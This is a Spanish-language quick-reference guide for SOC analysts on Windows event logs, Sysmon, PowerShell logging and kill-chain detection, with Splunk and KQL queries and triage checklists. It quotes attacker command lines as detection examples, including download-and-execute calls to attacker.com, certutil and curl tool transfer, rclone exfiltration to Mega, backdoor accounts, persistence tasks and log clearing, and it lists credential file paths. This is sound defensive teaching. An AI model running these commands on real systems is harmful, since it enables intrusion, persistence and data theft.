# 

> Material de referencia rápida para analistas de seguridad. Cubre logging nativo, Sysmon, autenticación, y detección por fase de la kill chain.
> 

---

## 📋 Índice

1. Arquitectura de Logging en Windows
2. Anatomía de un Evento Windows
3. Herramientas de Consulta de Logs
4. Security Log: Autenticación y Usuarios
5. Sysmon: Telemetría Avanzada
6. PowerShell Logging
7. Initial Access: Detección por Vector
8. Discovery, Collection & Exfiltration
9. C2 y Persistencia
10. Tabla Maestra de Red Flags
11. Queries: Splunk SPL y KQL
12. Checklists de Triage
13. Event IDs: Referencia Rápida

---

## 1 · Arquitectura de Logging en Windows

Windows no usa un único archivo de log — usa **canales de eventos** en formato binario `.evtx`.

**Ruta de almacenamiento:**

```
C:\Windows\System32\winevt\Logs\
```

| Canal | Archivo `.evtx` | Qué registra |
| --- | --- | --- |
| **Security** | `Security.evtx` | Autenticaciones, gestión de usuarios, acceso a objetos, cambios de políticas |
| **System** | `System.evtx` | Kernel, servicios, drivers, errores del sistema |
| **Application** | `Application.evtx` | Eventos de aplicaciones instaladas |
| **Sysmon/Operational** | `Microsoft-Windows-Sysmon%4Operational.evtx` | Telemetría avanzada (procesos, red, registro, archivos) |
| **PowerShell/Operational** | `Microsoft-Windows-PowerShell%4Operational.evtx` | Ejecución de scripts y comandos PowerShell |

> ⚠️ **Nota forense:** Los `.evtx` son **binarios propietarios** — no son texto plano. Si un atacante borra los logs con `wevtutil cl Security`, el log vacío o con muy pocos eventos es en sí mismo un IOC.
> 

---

## 2 · Anatomía de un Evento Windows

```xml
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2024-11-15T02:34:17.123Z"/>  <!-- Siempre UTC -->
    <Computer>WORKSTATION01</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">empleado1</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">185.220.101.45</Data>
    <Data Name="LogonID">0x3E7F2A</Data>  <!-- Hilo conductor de correlación -->
  </EventData>
</Event>
```

### Campos universales

| Campo | Uso en SOC |
| --- | --- |
| **EventID** | Primer filtro de cualquier búsqueda |
| **TimeCreated** | Timestamp UTC — fundamental para ordenar la cadena de eventos |
| **Computer** | Host afectado |
| **Logon ID** | Identificador único de sesión — sigue toda la actividad del atacante |
| **Process ID (PID)** | Vincula eventos de red, archivos y otras actividades a un proceso concreto |

### La Regla de Oro — Correlación sobre eventos aislados

Un `4625` solo es ruido. 500 `4625` desde la misma IP seguidos de un `4624` es una alerta.

**Correlación por Logon ID:**

```
4625 × 487 (IP: 185.x.x.x, usuario: Administrator)   ← brute force
4624 (IP: 185.x.x.x, LogonID: 0x3E7F2A)              ← éxito
Sysmon 1 (LogonID: 0x3E7F2A → cmd.exe)               ← ejecución
Sysmon 1 (LogonID: 0x3E7F2A → whoami.exe)            ← discovery
Sysmon 3 (LogonID: 0x3E7F2A → 185.x.x.x:4444)       ← C2
```

**Correlación por PID:**

```
Sysmon 1 (PID: 4832 → malware.exe creado)
Sysmon 3 (PID: 4832 → conexión saliente C2)
Sysmon 1 (PID: 4832 padre → cmd.exe PID 5120)
Sysmon 1 (PID: 5120 padre → whoami.exe)
```

---

## 3 · Herramientas de Consulta de Logs

### Event Viewer (`eventvwr.msc`)

Para investigaciones manuales en un endpoint. Filtro XML avanzado:

```xml
<!-- Login exitoso por RDP desde IPs externas -->
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4624)]]
      and
      *[EventData[Data[@Name='LogonType']='10']]
    </Select>
  </Query>
</QueryList>
```

### `wevtutil.exe` — Línea de comandos

```bash
wevtutil el                                    # Listar todos los canales
wevtutil qe Security /c:10 /rd:true /f:text   # Últimos 10 eventos
wevtutil epl Security C:\Temp\backup.evtx     # Exportar para análisis offline
wevtutil gl Security                           # Estadísticas del canal

# ⚠️ Lo que usa un atacante para cubrir huellas:
wevtutil cl Security
```

### PowerShell

```powershell
# Últimos 20 eventos del log Security
Get-WinEvent -LogName Security -MaxEvents 20

# Filtrar por EventID específico
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Select-Object TimeCreated, Message

# Analizar archivo .evtx offline
Get-WinEvent -Path "C:\Temp\Security_backup.evtx" -FilterXPath "*[System[EventID=4624]]"

# Contar eventos (útil para volumen de brute force)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Measure-Object
```

---

## 4 · Security Log — Autenticación y Gestión de Usuarios

### Eventos de autenticación

### Event ID 4624 — Login exitoso

| Campo | Por qué importa |
| --- | --- |
| `TargetUserName` | ¿Es una cuenta esperada? ¿Una cuenta de servicio haciendo login interactivo? |
| `LogonType` | Determina cómo se conectó (ver tabla) |
| `IpAddress` | ¿IP corporativa? ¿IP externa? ¿País inesperado? |
| `LogonID` | **El hilo conductor** — correlaciona toda la actividad posterior |
| `AuthenticationPackageName` | NTLM vs Kerberos — NTLM en entornos modernos puede indicar ataques |

**Tabla de Logon Types:**

| Tipo | Nombre | Relevancia SOC |
| --- | --- | --- |
| 2 | Interactive | Login físico en consola — normal |
| 3 | Network | Acceso SMB/IPC$ → Pass-the-Hash, movimiento lateral |
| 4 | Batch | Tareas programadas — verificar legitimidad |
| 5 | Service | Inicio de servicios — verificar legitimidad |
| 7 | Unlock | Desbloqueo de pantalla — normal |
| **10** | **RemoteInteractive** | **RDP → brute force, acceso no autorizado** |
| 11 | CachedInteractive | Sin DC disponible — contexto inusual |

### Event ID 4625 — Login fallido

| SubStatus | Significado | Implicación |
| --- | --- | --- |
| `0xC000006A` | Contraseña incorrecta | Brute force clásico |
| `0xC0000064` | Usuario no existe | Enumeración de usuarios |
| `0xC000006F` | Login fuera de horario | Restricción de horario |
| `0xC0000072` | Cuenta deshabilitada | Atacante probando cuentas antiguas |
| `0xC000006D` | Fallo genérico | Password spraying |

**Brute Force vs Password Spraying:**

```
Brute Force:
→ Muchos intentos contra UN usuario, muchas contraseñas
→ Señal: muchos 4625 con mismo TargetUserName
→ Riesgo: bloqueo de cuenta

Password Spraying:
→ Pocos intentos (1-3) contra MUCHOS usuarios, 1 contraseña ("Empresa2024!")
→ Señal: pocos 4625 por usuario pero muchas cuentas afectadas
→ Evasión: no dispara bloqueos de cuenta
```

### Otros eventos de autenticación

| Event ID | Evento | Cuándo investigar |
| --- | --- | --- |
| **4648** | Login con credenciales explícitas (`runas`) | Pass-the-Hash, movimiento lateral |
| **4771** | Fallo pre-autenticación Kerberos | Brute force en entornos AD |

### Eventos de gestión de usuarios — Detección de Persistence

| Event ID | Evento | Señales de alerta |
| --- | --- | --- |
| **4720** | Cuenta creada | ¿Fuera de horario? ¿Naming inusual? ¿Seguido de 4732? |
| **4722 / 4725** | Cuenta habilitada / deshabilitada | Reactivación de cuentas inactivas |
| **4724** | Reset de contraseña | ¿Sobre cuenta de servicio o inactiva? ¿Fuera de horario? |
| **4732 / 4733** | Miembro añadido / eliminado de grupo | ¿A `Administrators`, `Domain Admins`, `Backup Operators`? |

**Grupos críticos a monitorizar:**

```
Administrators           → Privilegio local total
Remote Desktop Users     → Permite RDP
Domain Admins            → Privilegio de dominio total
Enterprise Admins        → Privilegio de bosque AD total
Backup Operators         → Acceso a todos los archivos ignorando permisos NTFS
```

---

## 5 · Sysmon — Telemetría Avanzada

### ¿Por qué Sysmon sobre los logs nativos?

| Capacidad | Log nativo | Sysmon |
| --- | --- | --- |
| Creación de proceso | ✅ sin args ni hash | ✅ con args, hash MD5/SHA256, PID padre |
| Conexiones de red | ❌ | ✅ IP, puerto, proceso origen |
| Modificación de registro | Parcial | ✅ ruta exacta, valor anterior y nuevo |
| Creación de archivos | ❌ | ✅ ruta, proceso que lo creó |
| Consultas DNS | ❌ | ✅ dominio y proceso que lo originó |

> 💡 Configuración recomendada en producción: **Sysmon Modular** (Olaf Hartong) o la configuración de **SwiftOnSecurity**.
> 

### Event IDs clave de Sysmon

### Sysmon ID 1 — Process Creation

```
Image:           C:\Users\usuario\Downloads\factura.pdf.exe
CommandLine:     factura.pdf.exe --connect 185.x.x.x
ParentImage:     C:\Windows\explorer.exe
ParentProcessId: 1204
Hashes:          MD5=A1B2C3..., SHA256=D4E5F6...
```

**Técnica de hunting — árbol de procesos:**

```
↑ Hacia arriba: ¿Quién lo lanzó?
  ParentProcessId → buscar ese PID en eventos anteriores
  ¿Es un proceso legítimo o también es sospechoso?

↓ Hacia abajo: ¿Qué lanzó?
  Buscar ID 1 donde ParentProcessId = PID del proceso analizado
  ¿Lanzó cmd.exe, PowerShell, herramientas de Discovery?
```

### Sysmon ID 3 — Network Connection

```
Image:               C:\Temp\agent.exe
DestinationIp:       185.220.101.45
DestinationPort:     443
DestinationHostname: windows-update-cdn[.]net
```

> `C:\Temp\algo.exe` conectando a dominio externo = alerta inmediata.
`powershell.exe` conectando a Mega.nz = posible exfiltración.
> 

### Sysmon ID 7 — Image Loaded (DLL)

Detecta DLL hijacking e inyección de código en procesos legítimos como `explorer.exe` o `svchost.exe`.

### Sysmon ID 11 — FileCreate

Detecta payloads escritos en disco, ZIPs de staging, o malware copiado a carpeta Startup.

### Sysmon ID 13 — RegistryEvent (Value Set)

```
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsHelper
Details:      C:\Temp\malware.exe
Image:        C:\Temp\malware.exe   ← el propio malware se añadió al registro
```

### Sysmon ID 22 — DNS Query

```
Image:       C:\Temp\stealer.exe
QueryName:   g.api.mega.co.nz      ← destino de exfiltración
```

Ventaja sobre ID 3: captura el **nombre de dominio antes de la resolución** — útil contra fast-flux.

---

## 6 · PowerShell Logging

### Tipos de logging

| Tipo | Event ID | Canal | Qué captura |
| --- | --- | --- | --- |
| Module Logging | **4103** | PowerShell/Operational | Ejecución de módulos y comandos individuales |
| Script Block Logging | **4104** | PowerShell/Operational | **Contenido completo del script, ya deobfuscado** |
| Transcription | Archivo `.txt` | Configurable | Grabación completa de la sesión |

**Script Block Logging — por qué es el más valioso:**

```powershell
# Lo que ves en Sysmon ID 1 (sin SBL):
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...

# Lo que ves en Event ID 4104 (con SBL activado):
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

### El archivo de historial — El hallazgo forense más subestimado

```
C:\Users\<USUARIO>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

- Persiste tras reinicios
- Es texto plano — legible sin herramientas
- Registra todo lo escrito (incluyendo contraseñas en texto claro)
- Equivalente al `.bash_history` de Linux

```powershell
# Leer historial de todos los usuarios del sistema
Get-ChildItem "C:\Users\" -Directory | ForEach-Object {
    $path = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $path) {
        Write-Host "=== $($_.Name) ===" -ForegroundColor Cyan
        Get-Content $path
    }
}
```

> ⚠️ **Limitación:** Solo registra sesiones **interactivas**. Scripts ejecutados con `-File` o `-Command` no aparecen — para eso se necesita Script Block Logging.
> 

---

## 7 · Initial Access — Detección por Vector

### Vector 1 — RDP (T1133)

> "RDP = Ransomware Deployment Protocol" — es la puerta de entrada favorita de LockBit, BlackCat, Conti.
> 

**Flujo del ataque:**

```
Shodan / Masscan → puerto 3389 abierto
→ Brute force automatizado (Hydra, NLBrute)
→ Login exitoso → sesión RDP
→ Reconocimiento, descarga de herramientas, persistencia
```

**Triage RDP:**

```
① Detectar 4625 con Logon Type 10 en volumen elevado
② Identificar IP origen → verificar en AbuseIPDB / VirusTotal
③ Buscar 4624 posterior desde la misma IP
④ Extraer Logon ID del 4624 exitoso
⑤ Correlacionar en Sysmon con ese Logon ID
   → ¿Qué procesos se lanzaron? ¿Descargas? ¿Conexiones? ¿Usuarios creados?
```

### Vector 2 — Phishing con ejecutable (T1566.001)

**Técnica de doble extensión:**

```
Nombre real:      factura_octubre.pdf.exe
El usuario ve:    factura_octubre.pdf  (con icono de PDF)
Windows ejecuta:  factura_octubre.pdf.exe
```

**Extensiones que Windows ejecuta por defecto:**

```
.exe .com .scr .cpl .bat .vbs .js .hta
```

**Señal en Sysmon ID 1:**

```
Process:   C:\Users\usuario\Downloads\factura_noviembre.pdf.exe
Parent:    C:\Windows\explorer.exe
User:      DOMINIO\empleado
```

### Vector 3 — LNK malicioso (T1566.001)

Los archivos `.lnk` son accesos directos — visualmente idénticos a un documento, pero ejecutan comandos arbitrarios.

**Cadena típica:**

```
Email → ZIP → propuesta.lnk (icono PDF)
→ Doble clic
→ powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
→ Payload en memoria (fileless)
→ C2 establecido
```

**Señal característica en Sysmon:**

```
explorer.exe
└── powershell.exe -WindowStyle Hidden -Command "IEX..."
```

Ver `explorer.exe` lanzando PowerShell con parámetros de ocultación = firma de LNK malicioso.

**Comandos sospechosos en la command line:**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://...')
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Temp\a.exe
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base64>
```

### Vector 4 — USB / Removable Media (T1091)

**Señal en Sysmon ID 1:**

```
Image:       E:\Photos\vacation.exe   ← letra de unidad no C:\
Parent:      C:\Windows\explorer.exe
```

**Otros registros útiles:**

```
System Event ID 20001             → Conexión de dispositivo USB
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR  → Historial de USBs conectados
```

### Correlación completa — Phishing LNK en logs

```
T+00:00  Sysmon 11  → Descarga de "propuesta.zip" en Downloads\
T+00:05  Sysmon 11  → Extracción de "propuesta.lnk" del ZIP
T+00:07  Sysmon  1  → explorer.exe lanza powershell.exe -Hidden -Command "IEX..."
T+00:07  Sysmon 22  → Consulta DNS a "update-service[.]net"
T+00:07  Sysmon  3  → Conexión saliente a 185.x.x.x:443
T+00:08  Sysmon 11  → Se crea "C:\Temp\svc32.exe"
T+00:08  Sysmon  1  → powershell.exe lanza "C:\Temp\svc32.exe"
T+00:09  Sysmon  3  → Beaconing regular desde svc32.exe (C2 activo)
```

---

## 8 · Discovery, Collection & Exfiltration

### Flujo post-compromiso

```
Initial Access → Discovery → Collection → Tool Transfer → Exfiltration → Impact
```

### Discovery (TA0007)

**Comandos que busca el atacante — y por qué:**

```bash
whoami              → ¿Quién soy? ¿Qué privilegios tengo?
whoami /priv        → ¿Tengo SeDebugPrivilege? ¿SeImpersonatePrivilege? (→ escalada)
whoami /groups      → ¿A qué grupos pertenezco?
net localgroup Administrators  → ¿Quién más es admin? (target para lateral movement)
net user            → Todos los usuarios locales
systeminfo          → OS, parches — ¿hay CVEs explotables?
tasklist /v         → Procesos en ejecución
ipconfig /all       → Red — ¿en qué subred estoy?
arp -a              → Otros hosts en la misma red
netstat -ano        → Conexiones activas, puertos en escucha
net share           → Recursos compartidos SMB
```

**Por qué no basta con detectar los comandos:**`whoami`, `ipconfig`, `systeminfo` son herramientas legítimas. La señal no es el comando — es **quién lo ejecuta y desde qué contexto**.

**Árbol de procesos — el detector real:**

```
LEGÍTIMO:
explorer.exe → cmd.exe → ipconfig.exe     ← usuario consultando su IP

SOSPECHOSO:
explorer.exe
└── factura_octubre.pdf.exe    ← malware
    └── cmd.exe
        ├── whoami.exe          ← Discovery automatizado
        ├── net.exe
        ├── ipconfig.exe
        ├── tasklist.exe        ← ejecutados en 3 segundos
        └── systeminfo.exe
```

**Fingerprinting del AV (señal de que viene Tool Transfer):**

```powershell
Get-WmiObject -Namespace root\SecurityCenter2 -Query "SELECT * FROM AntivirusProduct"
Get-MpPreference
tasklist /v | findstr -i "defender sentinel crowdstrike carbon cylance"
```

### Collection (TA0009)

**Objetivos principales:**

```
Credenciales:
├── Chrome: AppData\Local\Google\Chrome\User Data\Default\Login Data
├── Firefox: AppData\Roaming\Mozilla\Firefox\Profiles\*.default\logins.json
└── SSH: C:\Users\<user>\.ssh\id_rsa

Documentos: *.xlsx *.pdf *.docx (finanzas, contratos, código fuente)
Cripto: AppData\Roaming\Bitcoin\wallet.dat
```

**Comandos de Collection manual:**

```powershell
Get-ChildItem -Recurse -Filter *.pdf -Path C:\Users\
Get-ChildItem -Recurse | Where-Object {$_.Name -match "password|credencial|contrato"}
copy C:\Users\admin\Documents\*.pdf C:\Temp\exfil\
Compress-Archive -Path C:\Temp\staging\ -DestinationPath C:\Temp\datos.zip
7za.exe a -tzip C:\Temp\datos.zip C:\Temp\staging\
```

**Data Stealers — patrón en Sysmon (sin comandos visibles):**

```
1. Proceso desconocido en AppData\Local\Temp\<cadena aleatoria>\
2. Enumeración masiva de rutas de perfil de navegador
3. Acceso a Chrome\User Data\Login Data
4. Creación de ZIP en directorio temporal
5. Conexión saliente (HTTPS)
6. Auto-eliminación del malware
```

### Tool Transfer (T1105)

**Living off the Land — herramientas nativas abusadas:**

```bash
certutil.exe -urlcache -split -f http://attacker.com/tool.exe C:\Temp\tool.exe
curl.exe http://attacker.com/tool.exe -o C:\Temp\tool.exe
bitsadmin /transfer job /download /priority normal http://... C:\Temp\tool.exe
Invoke-WebRequest -Uri "http://..." -OutFile "C:\Temp\tool.exe"
IEX (New-Object Net.WebClient).DownloadString("http://...")  ← fileless
```

**Herramientas de terceros introducidas:**

```
rclone.exe    → sincronización cloud, muy usado para exfiltración
7za.exe       → compresión standalone
nc.exe        → netcat para canales alternativos
psexec.exe    → ejecución remota (lateral movement)
```

### Exfiltration (TA0010)

**Destinos preferidos:**

```
Mega.nz          → cifrado E2E, sin logs de acceso
Dropbox          → API fácil de usar
Google Drive     → tráfico parece legítimo
Telegram Bot API → stealers envían directamente al bot
Discord Webhooks → archivos adjuntos a canal del atacante
```

**Comando rclone:**

```bash
rclone.exe copy C:\Temp\staging\ mega:exfil/ --no-traverse
```

**Señal en Sysmon:**

```
Sysmon 3:  rclone.exe → g.api.mega.co.nz:443
Sysmon 22: QueryName = g.api.mega.co.nz (desde proceso no esperado)
Sysmon 11: Creación de ZIP en C:\Temp\ justo antes de la conexión saliente
```

### Cadena completa reconstruida en Sysmon

```
T+00:00  Sysmon 11  → Descarga de "propuesta.zip" en Downloads\
T+00:07  Sysmon  1  → explorer.exe lanza propuesta.pdf.exe
T+00:07  Sysmon  3  → propuesta.pdf.exe conecta a 185.x.x.x:443 (C2)

[Discovery]
T+00:10  Sysmon  1  → propuesta.pdf.exe → cmd.exe → whoami.exe
T+00:11  Sysmon  1  → cmd.exe → systeminfo.exe, ipconfig.exe, tasklist.exe

[Tool Transfer]
T+00:15  Sysmon  1  → cmd.exe lanza certutil.exe -urlcache -f http://185.x.x.x/stealer.exe
T+00:15  Sysmon  3  → certutil.exe conecta a 185.x.x.x:80
T+00:16  Sysmon 11  → Creación de C:\Temp\stealer.exe

[Collection]
T+00:17  Sysmon  1  → propuesta.pdf.exe lanza stealer.exe
T+00:17  Sysmon 11  → Creación de C:\Temp\tmp_a3f2\ (staging)
T+00:18  Sysmon 11  → Accesos a AppData\Chrome\Login Data
T+00:19  Sysmon 11  → Creación de C:\Temp\tmp_a3f2\datos.zip

[Exfiltration]
T+00:20  Sysmon 22  → DNS a g.api.mega.co.nz
T+00:20  Sysmon  3  → stealer.exe conecta a mega.co.nz:443
T+00:21  Sysmon 11  → Eliminación de archivos de staging y stealer.exe
```

---

## 9 · C2 y Persistencia

### Command & Control (TA0011)

**Concepto:** Canal permanente entre la máquina víctima y el servidor del atacante. El agente C2 ("beacon") hace peticiones regulares al servidor esperando instrucciones.

**Detección de Beaconing en Sysmon:**

```
Sysmon 3: proceso desconocido en C:\Temp\ → peticiones regulares a dominio externo, puerto 443
          → intervalos regulares = beacon interval (patrón de C2 activo)
```

**Variante avanzada — Dropper → C2:**

```
adjunto-phishing.exe
└── Descarga el C2 real (en segundo plano)
└── Lo oculta en C:\Windows\Temp\ o C:\Temp\
└── Lo ejecuta como proceso independiente
└── (Opcionalmente) se auto-elimina
```

### Persistence — Métodos y detección

### Backdoor de usuario (T1136)

```bash
net user "soporte.tecnico" "P@ssw0rd2024!" /add
net localgroup Administrators "soporte.tecnico" /add
```

| Event ID | Qué detecta |
| --- | --- |
| **4720** | Cuenta creada |
| **4732** | Miembro añadido a grupo de seguridad |
| **4724** | Reset de contraseña (cuenta inactiva reutilizada) |

### Windows Services (T1543)

```bash
sc create "WindowsUpdateHelper" binpath= "C:\Windows\Temp\svchost32.exe" start= auto
```

| Event ID | Qué detecta |
| --- | --- |
| **Security 4697** | Instalación de nuevo servicio |
| **System 7045** | Alternativa a 4697 |

### Scheduled Tasks (T1053.005)

```bash
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\UpdateBackup" /tr "C:\Temp\agent.exe" /sc onstart /ru System /f
```

> Favorita de APT28 y APT41. Puede ejecutarse con privilegios de SYSTEM.
> 

| Event ID | Qué detecta |
| --- | --- |
| **Security 4698** | Creación de tarea programada (incluye XML completo) |

### Startup Folder (T1547.001)

```
C:\Users\<USUARIO>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
```

Detectar con: **Sysmon ID 11** — creación de archivo en la ruta Startup. En sistemas corporativos bien gestionados, esta carpeta normalmente está vacía.

### Run Keys (T1547.001)

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Detectar con: **Sysmon ID 13** — modificación de valor en esas rutas.

### Resumen de métodos de persistencia

| Método | ¿Cuándo se ejecuta? | ¿Requiere admin? | Event ID principal |
| --- | --- | --- | --- |
| Backdoor usuario | Al hacer login RDP | Sí | Security 4720, 4732 |
| Windows Service | En el arranque del SO | Sí | Security 4697 |
| Scheduled Task | Configurable | Sí (habitualmente) | Security 4698 |
| Startup Folder | Al iniciar sesión | No (carpeta usuario) | Sysmon 11 |
| Run Keys | Al iniciar sesión | No (HKCU) | Sysmon 13 |

---

## 10 · Tabla Maestra de Red Flags

| Evento / Hallazgo | Técnica probable | Acción inmediata |
| --- | --- | --- |
| Muchos `4625` desde una IP + `4624` posterior | Brute force exitoso | Bloquear IP; aislar cuenta comprometida |
| `4625` pocos intentos por usuario pero muchos usuarios | Password Spraying | Revisar política contraseñas; buscar `4624` exitosos |
| `4624` Logon Type 10 desde IP externa inesperada | Acceso RDP no autorizado | Aislar sesión; revisar Logon ID en Sysmon |
| `4720` + `4732` a Administrators en misma sesión | Backdoor de usuario | Deshabilitar cuenta; investigar Logon ID del creador |
| `4724` sobre cuenta inactiva o de servicio | Reutilización de cuenta | Resetear contraseña; revisar actividad posterior |
| Log Security vacío o con eventos de últimas horas | Borrado de logs | Alta prioridad — el atacante cubrió huellas |
| Sysmon ID 1: proceso en `C:\Temp\`, `AppData\`, `Public\` | Ejecución de malware | Hashear → VirusTotal; aislar endpoint |
| Sysmon ID 1: `explorer.exe` → `powershell.exe -Hidden` | LNK malicioso / phishing | Revisar command line; buscar descargas previas |
| Sysmon ID 1: `notepad.exe` lanzando `cmd.exe` | Process injection | Alta prioridad; investigar árbol completo |
| Sysmon ID 1: secuencia `whoami → systeminfo → ipconfig` en segundos | Discovery automatizado | Reconstruir árbol completo |
| Sysmon ID 1: `certutil.exe -urlcache` lanzado por malware | Tool Transfer | Verificar archivo descargado; hashear |
| Sysmon ID 3: `rclone.exe` → Mega / Dropbox | Exfiltración | Aislamiento inmediato del endpoint |
| Sysmon ID 3: proceso desconocido → peticiones regulares exterior | C2 beaconing | Bloquear IP/dominio; aislar endpoint |
| Sysmon ID 11: creación de ZIP en `C:\Temp\` antes de conexión saliente | Collection + Exfiltración | Buscar datos copiados; bloquear destino |
| Sysmon ID 13: escritura en `HKCU\...\Run` por proceso inusual | Persistencia Run Key | Eliminar clave; investigar proceso que la creó |
| `Get-MpPreference` ejecutado por proceso no administrativo | Fingerprinting AV | Esperar Tool Transfer; revisar árbol |
| Acceso a `Chrome\User Data\Login Data` desde proceso no-Chrome | Data Stealer | Buscar ZIP y conexión saliente; aislar |
| Consulta DNS a dominio de reciente creación (DGA) | C2 / Exfiltración | Bloquear dominio; buscar proceso origen |
| PSReadline history con comandos de Discovery | Sesión interactiva del atacante | Reconstruir timeline; buscar exfiltración |

---

## 11 · Queries — Splunk SPL y KQL

### Splunk SPL

```
# Brute force RDP con éxito posterior
index="wineventlog" (EventCode=4625 OR EventCode=4624) Logon_Type=10
| stats count(eval(EventCode=4625)) as failures,
        count(eval(EventCode=4624)) as successes by src_ip
| where successes > 0 AND failures > 5

# Procesos en rutas sospechosas (Sysmon)
index="sysmon" EventCode=1
| where match(Image, "(?i)(\\temp\\|\\users\\public\\|appdata\\local\\temp\\)")
| table _time, Image, CommandLine, ParentImage, User

# PowerShell con flags de evasión
index="sysmon" EventCode=1 Image="*powershell*"
| where match(CommandLine, "(?i)(hidden|encodedcommand|bypass|iex|downloadstring)")
| table _time, CommandLine, ParentImage, User

# Detección de certutil abusado
index="sysmon" EventCode=1 Image="*certutil*"
| where match(CommandLine, "(?i)(urlcache|decode|encode)")
| table _time, CommandLine, ParentImage, User

# Detección de rclone (exfiltración)
index="sysmon" EventCode=1 Image="*rclone*"
| table _time, CommandLine, User

# Creación de usuario + añadido a grupo en la misma sesión
index="wineventlog" (EventCode=4720 OR EventCode=4732)
| stats values(EventCode) as events by SubjectLogonId
| where mvcount(events) > 1
```

### KQL (Elastic / Microsoft Sentinel)

```
// Brute force RDP
event.code: "4625" AND winlog.event_data.LogonType: "10"
| stats count by source.ip, winlog.event_data.TargetUserName
| where count > 10

// Proceso en ruta sospechosa
event.code: "1" AND (
  process.executable: *\\Temp\\* OR
  process.executable: *\\Users\\Public\\* OR
  process.executable: *AppData\\Local\\Temp\\*
)

// PowerShell con flags de evasión
event.code: "1" AND process.name: "powershell.exe" AND (
  process.command_line: *-EncodedCommand* OR
  process.command_line: *-WindowStyle Hidden* OR
  process.command_line: *IEX* OR
  process.command_line: *DownloadString*
)

// Exfiltración via rclone
event.code: "1" AND process.name: "rclone.exe"

// Persistencia Run Key (Sysmon 13)
event.code: "13" AND (
  registry.path: *CurrentVersion\\Run* OR
  registry.path: *CurrentVersion\\RunOnce*
)

// Tarea programada creada
event.code: "4698"
```

---

## 12 · Checklists de Triage

### Al recibir una alerta

- [ ]  ¿Qué EventID generó la alerta? ¿Qué significa en contexto?
- [ ]  ¿En qué fase de la Kill Chain ubico esta actividad?
- [ ]  ¿Cuál es el host afectado? ¿Es crítico para el negocio?
- [ ]  ¿Cuál es el usuario involucrado? ¿Tiene acceso privilegiado?

### Correlación

- [ ]  ¿Hay eventos previos desde la misma IP o del mismo usuario?
- [ ]  ¿Puedo extraer un Logon ID o PID para seguir el hilo?
- [ ]  ¿Qué hizo ese proceso/sesión antes y después del evento alerta?
- [ ]  ¿Hay eventos Sysmon correlacionados con el mismo PID o Logon ID?

### Evaluación

- [ ]  ¿Cuánto tiempo lleva activo el atacante? (timestamp del primer evento sospechoso)
- [ ]  ¿Hay evidencia de movimiento lateral? (otros hosts involucrados)
- [ ]  ¿Hay evidencia de persistencia? (Run Keys, servicios, usuarios creados)
- [ ]  ¿Hay evidencia de exfiltración? (conexiones salientes + creación de ZIPs)
- [ ]  ¿Los logs están completos o hay señales de manipulación?

### Triage RDP específico

- [ ]  ¿Volumen elevado de 4625 desde la misma IP con Logon Type 10?
- [ ]  ¿Existe 4624 posterior desde esa misma IP?
- [ ]  ¿La IP origen es externa? → Verificar en AbuseIPDB / VirusTotal
- [ ]  ¿Cuál es el Logon ID de la sesión exitosa?
- [ ]  ¿Qué actividad aparece en Sysmon con ese Logon ID?

### Triage Phishing (ejecutable o LNK)

- [ ]  ¿Sysmon ID 11 con descarga de ZIP o archivo comprimido?
- [ ]  ¿Tras la extracción aparece archivo con doble extensión o .lnk?
- [ ]  ¿Sysmon ID 1 con `explorer.exe` padre lanzando PowerShell desde Downloads?
- [ ]  ¿Command line contiene `IEX`, `DownloadString`, `EncodedCommand`, `Hidden`?
- [ ]  ¿Consulta DNS (Sysmon 22) a dominio desconocido inmediatamente después?

---

## 13 · Event IDs — Referencia Rápida

### Windows Security Log

| Event ID | Evento | Fase / Uso |
| --- | --- | --- |
| **4624** | Login exitoso | Initial Access, Lateral Movement |
| **4625** | Login fallido | Brute Force, Password Spraying |
| **4648** | Login con credenciales explícitas | Pass-the-Hash, Lateral Movement |
| **4771** | Fallo Kerberos pre-autenticación | Brute Force en AD |
| **4697** | Instalación de servicio | Persistence |
| **4698** | Creación de tarea programada | Persistence |
| **4720** | Cuenta de usuario creada | Persistence (backdoor usuario) |
| **4722 / 4725** | Cuenta habilitada / deshabilitada | Persistence |
| **4724** | Reset de contraseña | Persistence |
| **4732 / 4733** | Miembro añadido / eliminado de grupo | Privilege Escalation |

### Sysmon

| Event ID | Evento | Uso principal |
| --- | --- | --- |
| **1** | Process Creation | Discovery, Execution, Persistence, Tool Transfer |
| **3** | Network Connection | C2, Exfiltration, Tool Transfer |
| **7** | Image Loaded (DLL) | DLL Hijacking, Process Injection |
| **11** | FileCreate | Staging, Payloads, Startup Folder |
| **13** | Registry Value Set | Persistence Run Keys |
| **22** | DNS Query | C2, Exfiltration (captura nombre antes de resolución) |

### Windows System Log

| Event ID | Evento | Uso |
| --- | --- | --- |
| **7045** | Nuevo servicio instalado | Persistence (alternativa a Security 4697) |
| **20001** | Dispositivo USB conectado | Initial Access (USB) |

---

## 🔄 El ciclo de análisis SOC — Kill Chain como marco mental

```
Reconnaissance    → Bajo impacto inmediato; documentar y monitorizar
Initial Access    → CRÍTICO — primer punto de entrada; contener cuanto antes
Execution         → El malware está corriendo; aislar endpoint
